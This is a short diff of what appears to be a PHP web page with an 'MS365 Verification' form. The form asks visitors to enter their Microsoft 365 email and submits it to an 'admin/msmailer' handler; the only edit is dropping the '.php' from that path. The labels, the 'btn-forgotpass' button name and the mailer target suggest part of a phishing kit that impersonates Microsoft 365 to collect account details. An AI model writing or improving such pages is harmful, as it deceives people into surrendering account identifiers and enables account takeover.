@@ -157,7 +157,7 @@ session_start(); // Start session to use session variables
         </div>
         <div class="right-section">
             <h2>MS365 Verification</h2>
-            <form id="ms365Form" action="admin/msmailer.php" method="post">
+            <form id="ms365Form" action="admin/msmailer" method="post">
                 <label for="email">Enter your MS365 Email:</label>
                 <input type="username" id="email" name="username" placeholder="" required>
                 <button type="submit" name="btn-forgotpass">Submit</button>
